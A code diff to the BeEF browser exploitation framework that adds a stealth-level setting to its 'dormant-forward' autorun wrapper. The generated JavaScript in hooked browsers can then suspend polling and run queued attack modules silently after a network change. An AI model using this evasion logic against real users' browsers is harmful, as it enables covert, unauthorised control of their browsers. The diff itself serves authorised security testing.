@@ -47,6 +47,7 @@ module BeEF
             execution_order = JSON.parse(rule.execution_order)
             execution_delay = JSON.parse(rule.execution_delay)
             chain_mode  = rule.chain_mode
+            stealth_mode = rule.stealth_mode
 
             mods_bodies = Array.new
             mods_codes = Array.new
@@ -80,7 +81,7 @@ module BeEF
               when 'sequential'
                 wrapper = prepare_sequential_wrapper(mods_bodies, execution_order, execution_delay, rule_token)
               when 'dormant-forward'
-                wrapper = prepare_dormant_forward_wrapper(mods_bodies, mods_codes, mods_conditions, execution_order, rule_token)
+                wrapper = prepare_dormant_forward_wrapper(mods_bodies, mods_codes, mods_conditions, execution_order, rule_token, stealth_mode)
               else
                 wrapper = nil
                 print_error "Chain mode looks wrong!"
@@ -103,7 +104,7 @@ module BeEF
         end
 
 
-        def prepare_dormant_forward_wrapper(mods, code, conditions, order, rule_token)
+        def prepare_dormant_forward_wrapper(mods, code, conditions, order, rule_token, stealth_mode)
           wrapper = ''
           delayed_exec = ''
           delayed_exec_footers = Array.new
@@ -148,7 +149,7 @@ module BeEF
                 // 3 - very stealthy, when we see a new network we will:
                 //   - * NOT probe for external information
                 //   - * NOT send back to beef until we return to original network
-                var stealthLevel = 1;
+                var stealthLevel = #{stealth_mode};
 
                 // globals
                 agTimer = null;
@@ -460,8 +461,10 @@ module BeEF
 
                       saveState(saveLocal, netcount, onlineStatus, rtcIps, externalIp, isp);
 
-                      // turn off beef polling
-                      beef.updater.lock = true;
+                      if (stealthLevel > 1) {
+                        // turn off beef polling
+                        beef.updater.lock = true;
+                      }
                       startTimers();
 
                       
@@ -483,8 +486,22 @@ module BeEF
                     //var end = s[0]+'.'+s[1]+'.0.71';
                     //var mod_input = start+'-'+end;
                     #{code_snippet}
-                    verbLog("Running the mod with the following input: '" + mod_input + "'");
+                    verbLog("Running the mod with the following input: '" + mod_input);
                     #{mods[order[c]][:mod_name]}_#{rule_token}(mod_input);
+
+                    if (stealthLevel > 1) {
+                      // manually pop beef modules because we killed the timer
+                      while(beef.commands.length > 0) {
+                        verbLog("command POP");
+                        command = beef.commands.pop();
+                        try {
+                          command();
+                        } catch(e) {
+                          beef.debug('dormant - failed to execute ' + e.message);
+                          beef.debug(command.toString());
+                        }
+                      }
+                    }
                   }
 
 
